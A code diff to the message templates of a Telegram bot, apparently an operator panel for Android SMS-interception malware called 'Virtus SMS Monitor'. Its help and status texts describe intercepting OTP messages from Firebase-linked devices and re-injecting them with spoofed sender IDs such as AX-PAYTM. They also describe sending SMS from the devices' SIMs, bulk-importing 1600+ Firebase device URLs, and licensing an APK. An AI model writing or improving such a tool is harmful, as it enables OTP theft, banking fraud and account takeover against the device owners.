@@ -14,16 +14,9 @@ def format_addchannel_card(channel_id: str, sim_slot: int = 1) -> str:
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
-        f"Channel set (only this one monitored):\n"
-        f"{channel_id}\n\n"
-        "Make sure I am an ADMIN there!\n\n"
-        f"📶 Selected SIM: SIM {sim_slot}\n"
-        "Channel se SMS bhejne ke liye likho:\n"
-        "To: 9876543210\n"
-        "Message: apna text\n\n"
-        f"→ SIM {sim_slot} se real SMS jayega (body same)"
-        "</pre>\n\n"
-        "Next: <code>/startmonitor</code>"
+        f"📢 Channel: {channel_id}\n"
+        f"📶 SIM: {sim_slot}"
+        "</pre>"
     )
 
 
@@ -34,9 +27,9 @@ def format_firebase_connected_card(
     device_ids: list[str] | None = None,
 ) -> str:
     device_line = (
-        f"📱 Devices Found: {total} (online: {online_count})"
+        f"📱 Devices: {total} (online: {online_count})"
         if total
-        else "📱 Devices: 0 (koi bhi Firebase chalega — /fdy se device add karo)"
+        else "📱 Devices: 0"
     )
     ids_block = ""
     if device_ids:
@@ -51,9 +44,7 @@ def format_firebase_connected_card(
         f"URL: {firebase_url}\n"
         f"{device_line}"
         f"{ids_block}"
-        "</pre>\n\n"
-        "Pick device: <code>/fdy &lt;device_id&gt;</code>\n"
-        "Key wala: <code>/a &lt;device_id&gt;</code>"
+        "</pre>"
     )
 
 
@@ -122,7 +113,7 @@ def get_inject_key(profile: MonitorProfile | None, device: Device) -> str:
     device_key = (device.api_key or "").strip().upper()
     if is_valid_license_key_format(device_key) and license_key_exists(device_key):
         return device_key
-    return "Not set — /key generate"
+    return "—"
 
 
 def get_battery(device: Device) -> str:
@@ -141,6 +132,21 @@ def get_model_name(device: Device) -> str:
     return meta.get("model") or meta.get("device_model") or "Unknown"
 
 
+def _sim_button_label(sim: dict) -> str:
+    slot = sim.get("slot", 1)
+    number = sim.get("number") or "Unknown"
+    return f"📶 SIM {slot}: {number}"
+
+
+def _sim_lines_block(device: Device) -> str:
+    lines = []
+    for sim in get_sim_list(device):
+        slot = sim.get("slot", 1)
+        number = sim.get("number") or "Unknown"
+        lines.append(f"📶 SIM {slot}: {number}")
+    return "\n".join(lines) if lines else "📶 SIM: Unknown"
+
+
 def format_device_set_card(
     device: Device,
     selected_sim: int = 0,
@@ -148,43 +154,42 @@ def format_device_set_card(
     found_ms: int | None = None,
     status: str = "online",
 ) -> str:
-    sims = get_sim_list(device)
-    active = sims[selected_sim] if sims else {"slot": 1, "index": 0, "carrier": "SIM 1", "number": "Unknown"}
     device_short = short_device_id(device.name)
     db_url = device.firebase_source_url or "Not linked"
-    timing = f"\nFound in {found_ms}ms" if found_ms is not None else ""
-    status_icon = "🟢" if status == "online" else "🟡"
+    phone = device.phone_number or "Unknown"
+    timing = f" ⚡ Found in {found_ms}ms" if found_ms is not None else ""
+    if status == "online":
+        status_line = "🟢 Online"
+    elif status == "offline":
+        status_line = "🔴 Offline"
+    else:
+        status_line = "🟡 Idle"
 
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         "Device Found &amp; Set!\n\n"
-        f"📱 ID: {device_short}\n"
-        f"📦 Model: {get_model_name(device)}\n"
-        f"🔋 Battery: {get_battery(device)}\n"
-        f"{status_icon} Status: {status.title()}\n"
-        f"🔥 DB: {db_url}"
-        f"{timing}\n\n"
-        "⚠️ Previous monitoring was AUTO-STOPPED.\n"
-        "Use /startmonitor again when ready.\n\n"
-        "Select SIM to send FROM:"
-        "</pre>\n"
-        + "".join(
-            f"\n📶 SIM {sim.get('slot', idx + 1)}: {sim.get('number', 'Unknown')}"
-            for idx, sim in enumerate(get_active_sims(device))
-        )
+        f"📱 {device_short}\n"
+        f"📞 {phone}\n"
+        f"🔋 {get_battery(device)}\n"
+        f"{status_line}\n"
+        f"🗄️ DB: {db_url}\n"
+        f"{_sim_lines_block(device)}\n\n"
+        f"Select SIM to send FROM:{timing}"
+        "</pre>"
     )
 
 
 def device_set_keyboard(device: Device) -> InlineKeyboardMarkup:
+    sims = get_sim_list(device)
     rows = [
         [
             InlineKeyboardButton(
-                f"📶 SIM {sim['slot']} ({sim.get('number', 'Unknown')})",
+                _sim_button_label(sim),
                 callback_data=f"sim:{device.id}:{sim['index']}",
             )
         ]
-        for sim in get_active_sims(device)
+        for sim in sims
     ]
     return InlineKeyboardMarkup(rows)
 
@@ -205,15 +210,16 @@ def sim_monitoring_keyboard(device: Device) -> InlineKeyboardMarkup:
 
 def format_sim_selected_card(device: Device, sim_index: int = 0) -> str:
     active = get_selected_sim(device, sim_index)
+    slot = active.get("slot", 1)
+    number = active.get("number", "Unknown")
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
-        f"📱 Device: {short_device_id(device.name)} | {get_model_name(device)}\n"
-        f"📶 Selected: SIM {active.get('slot', 1)} ({active.get('number', 'Unknown')})"
-        "</pre>\n\n"
-        "Tap <b>Monitoring ON</b> to start\n"
-        "Pehle <code>/mynum</code> + <code>/addchannel</code> set karo\n\n"
-        f"Channel SMS → SIM {active.get('slot', 1)} se jayega"
+        f"📱 {short_device_id(device.name)}\n"
+        f"{_sim_lines_block(device)}\n"
+        f"✅ FROM SIM {slot}: {number}\n"
+        f"🔋 {get_battery(device)}"
+        "</pre>"
     )
 
 
@@ -232,7 +238,7 @@ def format_virtus_startup_card(queued_ms: int = 3, total_ms: int = 15) -> str:
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         "⚡ INJECT FORWARDED! [STARTUP]\n\n"
-        f"📤 Sender: {STARTUP_TEST_SENDER}\n"
+        f"📩 Sender: {STARTUP_TEST_SENDER}\n"
         f"🔒 {STARTUP_TEST_MESSAGE}\n\n"
         f"{format_timing_footer(queued_ms, total_ms)}"
         "</pre>"
@@ -252,7 +258,7 @@ def format_virtus_stream_card(
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         "⚡ INJECT FORWARDED! [STREAM]\n\n"
-        f"📤 Sender: {sender}\n"
+        f"📩 Sender: {sender}\n"
         f"🔒 {body}\n\n"
         f"{format_timing_footer(queued_ms, total_ms)}"
         "</pre>"
@@ -305,8 +311,7 @@ def format_auto_stop_card(minutes: int = 15) -> str:
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
-        f"⏱ Monitoring AUTO-STOPPED after {minutes} minutes.\n"
-        "Use /startmonitor to start again."
+        f"⏱ AUTO-STOPPED ({minutes} min)"
         "</pre>"
     )
 
@@ -331,16 +336,13 @@ def format_monitoring_card(
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         "Monitoring Started!\n\n"
-        f"📱 Device: {short_device_id(device.name)} | {get_model_name(device)}\n"
-        f"📶 FROM SIM: {sim_slot} ({sim_number})\n"
-        f"🔑 Inject Key: {inject_key}\n"
-        "📤 Incoming -&gt; spoof inject (same sender ID)\n"
-        f"📞 Real SMS -&gt; {target}\n"
-        f"📢 Channel: {channel} (last / addchannel only)\n"
-        f"⏱ Auto-stop in {auto_stop} minutes\n"
-        f"📦 Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
-        f"✅ Test SMS sent: {test_msg}\n"
-        f"(SIM {sim_slot} se /mynum par — recharge nahi to SMS nahi jayega)"
+        f"📱 {short_device_id(device.name)}\n"
+        f"📶 FROM SIM {sim_slot}: {sim_number}\n"
+        f"🔑 {inject_key}\n"
+        f"📞 /mynum: {target}\n"
+        f"📢 {channel}\n"
+        f"⏱ {auto_stop}m | 📦 skip {ignored_sms}\n"
+        f"✅ {test_msg}"
         "</pre>"
     )
 
@@ -364,78 +366,121 @@ def monitoring_keyboard(device: Device | None = None) -> InlineKeyboardMarkup:
 
 def format_welcome_message() -> str:
     return (
-        "✨ <b>Welcome to Premium Automation</b>\n"
-        "Fast, secure, and reliable OTP forwarding\n"
-        "directly to your Firebase connected devices.\n\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "💉 <b>Injector Setup (Sender Spoof)</b>\n"
-        "<pre>"
-        "1. /key KEY-XXXX-XXXX-XXXX\n"
-        "   License key (inject)\n"
-        "2. /fy &lt;device_id&gt;  (key ke saath)\n"
-        "   /fdy &lt;device_id&gt; (bina key)\n"
-        "3. Pick SIM → /addchannel → /startmonitor\n"
-        "   Incoming SMS replayed with SAME sender ID"
-        "</pre>\n\n"
-        "🔥 <b>Admin Setup (Firebase Panel)</b>\n"
+        "✅ <b>Virtus SMS Monitor</b>\n\n"
+        "Commands: <code>/startmonitar</code>\n"
+        "Guide: <code>/guide</code>"
+    )
+
+
+def format_commands_message() -> str:
+    """Full command list — /startmonitar only."""
+    return (
+        "📋 <b>Virtus SMS Monitor</b>\n\n"
+        "💉 <b>Injector Setup</b> (Today r Spoof)\n"
         "<pre>"
         "1. /setfirebase &lt;url&gt;\n"
-        "   Connect your Firebase DB\n"
+        "   /allfirebase\n"
+        "2. /key generate\n"
+        "   /key KEY-XXXX-XXXX-XXXX\n"
+        "3. /fdy &lt;device_id&gt;\n"
+        "4. SIM → /mynum → /addchannel → /startmonitor"
+        "</pre>\n\n"
+        "🔥 <b>Admin Setup</b> (Firebase Panel)\n"
+        "<pre>"
+        "1. /setfirebase &lt;url&gt;\n"
         "2. /allfirebase\n"
-        "   Bulk txt file import (1600+)\n"
         "3. /fb &lt;device_id&gt;\n"
-        "   Find device &amp; select SIM\n"
         "4. /mynum &lt;number&gt;\n"
-        "   Your forwarding number\n"
         "5. /addchannel &lt;id&gt;\n"
-        "   Add group for monitoring\n"
-        "6. /startmonitor\n"
-        "   Start auto-forwarding"
+        "6. /startmonitor"
         "</pre>\n\n"
         "👤 <b>User Setup</b>\n"
         "<pre>"
         "1. /setfirebase &lt;url&gt;\n"
-        "2. /fdy &lt;id&gt;  device find (bina key)\n"
-        "   /a &lt;id&gt;   key set hone ke baad\n"
+        "2. /setdevice &lt;id&gt;  /a &lt;id&gt;\n"
         "3. /mynum &lt;number&gt;\n"
         "4. /addchannel &lt;id&gt;\n"
         "5. /startmonitor"
         "</pre>\n\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
         "🎮 <b>Controls</b>\n"
         "<pre>"
-        "/stop     Pause monitor\n"
-        "/resume   Resume monitor\n"
-        "/status   View current stats\n"
-        "/send &lt;num&gt; &lt;msg&gt;  Manual SMS\n"
-        "/ping     Check latency"
-        "</pre>\n\n"
-        "👥 <b>Extra (Virtus)</b>\n"
+        "/stop       /resume\n"
+        "/status     /send\n"
+        "/ping       /key confirm"
+        "</pre>"
+    )
+
+
+def format_guide_message() -> str:
+    """Explanations only — /guide command."""
+    return (
+        "📖 <b>GUIDE — Kaise kaam karta hai</b>\n\n"
+        "<b>Setup flow</b>\n"
         "<pre>"
-        "/key generate   → new license key\n"
-        "/approve &lt;id&gt;  → user access\n"
-        "/allfirebase    → bulk txt scan"
+        "1. /setfirebase → Firebase connect\n"
+        "2. /fdy ya /fb → device select\n"
+        "3. SIM button → asli number dikhega\n"
+        "4. /mynum → incoming OTP inject target\n"
+        "5. /addchannel → group set\n"
+        "6. /startmonitor → Monitoring ON"
+        "</pre>\n\n"
+        "<b>/mynum</b>\n"
+        "<pre>"
+        "Sirf incoming OTP inject ke liye\n"
+        "Same sender ID (AX-PAYTM, VK-PAYTM)\n"
+        "SIM select se alag hai"
+        "</pre>\n\n"
+        "<b>Channel SMS</b>\n"
+        "<pre>"
+        "+91XXXXXXXXXX message\n"
+        "91XXXXXXXXXX message\n"
+        "XXXXXXXXXX message\n"
+        "→ Device se real SMS (selected SIM)"
+        "</pre>\n\n"
+        "<b>KEY</b>\n"
+        "<pre>"
+        "/key generate → nayi KEY\n"
+        "Max 2 devices per KEY\n"
+        "/key confirm → APK attach verify"
+        "</pre>\n\n"
+        "<b>/allfirebase</b>\n"
+        "<pre>"
+        ".txt file bulk import (1600+)\n"
+        "Firebase URLs ek saath add"
+        "</pre>\n\n"
+        "<b>Monitoring</b>\n"
+        "<pre>"
+        "ON message pin hoti hai\n"
+        "Test: Chacha Ji Pani Pila Do\n"
+        "Auto-stop: 15 min default"
+        "</pre>\n\n"
+        "<b>Admin</b>\n"
+        "<pre>"
+        "/approve &lt;telegram_id&gt;\n"
+        "/revoke &lt;telegram_id&gt;\n"
+        "/users /recent /search /stats"
         "</pre>"
     )
 
 
 def format_status_card(device: Device | None, profile: MonitorProfile | None, sms_count: int = 0) -> str:
     if not profile:
-        return "❌ Profile not set. Use /setfirebase first."
+        return "❌ <code>/setfirebase &lt;url&gt;</code>"
 
     monitoring = "🟢 ON" if profile.is_monitoring else "🔴 OFF"
     device_name = short_device_id(device.name) if device else "Not set"
     sims = get_sim_list(device) if device else []
     sim_index = profile.selected_sim_index or 0
-    sim_label = sims[sim_index]["carrier"] if sims else "N/A"
+    active_sim = get_selected_sim(device, sim_index) if device else {}
+    sim_label = f"SIM {active_sim.get('slot', 1)}: {active_sim.get('number', '?')}"
 
     return (
         "✅ <b>STATUS</b>\n\n"
         "<pre>"
         f"Monitor: {monitoring}\n"
         f"📱 Device: {device_name}\n"
-        f"📶 SIM: {sim_label}\n"
-        f"📞 My Number: {profile.phone_number or 'Not set'}\n"
+        f"📶 {sim_label}\n"
+        f"📞 /mynum: {profile.phone_number or '—'}\n"
         f"📢 Channel: {profile.channel_id or 'Not set'}\n"
         f"🔥 Firebase: {'Connected' if profile.firebase_url else 'Not set'}\n"
         f"📨 SMS Count: {sms_count}\n"
@@ -448,74 +493,33 @@ def format_ping_card(latency_ms: int) -> str:
     return (
         "✅ <b>PONG</b>\n\n"
         "<pre>"
-        f"🏓 Latency: {latency_ms}ms\n"
-        "Bot is online and ready!"
+        f"🏓 {latency_ms}ms"
         "</pre>"
     )
 
 
 def format_key_error_card() -> str:
-    return (
-        "❌ <b>KEY HELP</b>\n\n"
-        "<pre>"
-        "/key generate\n"
-        "  → Nayi license key (max 2 devices)\n\n"
-        "/key KEY-XXXX-XXXX-XXXX\n"
-        "  → License key set karo\n\n"
-        "/key status KEY-XXXX...\n"
-        "  → Devices + APK status\n"
-        "/key confirm\n"
-        "  → APK same key verify (Firebase check)\n\n"
-        "Firebase alag command se:\n"
-        "/setfirebase &lt;url&gt;\n"
-        "/allfirebase → .txt file attach"
-        "</pre>"
-    )
+    return "❌ <code>/key</code> — <code>/guide</code>"
 
 
 def format_key_generated_card(license_key: str) -> str:
     return (
         "✅ <b>KEY GENERATED</b>\n\n"
-        "<pre>"
-        f"🔑 {license_key}\n"
-        "📱 Max devices: 2\n"
-        "⏸ Polling: OFF (jab tak /startmonitor na ho)\n\n"
-        "Next:\n"
-        "1. /key " + license_key + "\n"
-        "2. APK mein SAME key + START SERVICE\n"
-        "3. /fy &lt;device_id&gt; → /mynum → /addchannel\n"
-        "4. /startmonitor (tabhi polling ON)"
-        "</pre>"
+        f"<pre>🔑 {license_key}</pre>"
     )
 
 
 def format_key_set_card(inject_key: str) -> str:
     return (
         "✅ <b>KEY SET</b>\n\n"
-        "<pre>"
-        f"🔑 {inject_key}\n"
-        "📱 Max: 2 devices\n"
-        "⏸ Polling: OFF\n\n"
-        "APK mein SAME original key + START SERVICE\n"
-        "Random key kaam nahi karegi\n\n"
-        "Next:\n"
-        "/fdy &lt;device_id&gt; → SIM pick (bina key)\n"
-        "/a &lt;device_id&gt; → key ke saath pick\n"
-        "/mynum &lt;number&gt;\n"
-        "/addchannel → /startmonitor"
-        "</pre>"
+        f"<pre>🔑 {inject_key}</pre>"
     )
 
 
 def format_license_key_set_card(firebase_url: str) -> str:
     return (
-        "✅ <b>SUCCESS</b>\n\n"
-        "<pre>"
-        "License Key Set!\n\n"
-        f"🔑 {firebase_url.upper()}\n\n"
-        "Koi bhi Firebase URL chalega — APK mein bhi same daalo\n\n"
-        "Next: /fy &lt;device_id&gt; → SIM → /mynum → /startmonitor"
-        "</pre>"
+        "✅ <b>KEY SET</b>\n\n"
+        f"<pre>🔑 {firebase_url.upper()}</pre>"
     )
 
 
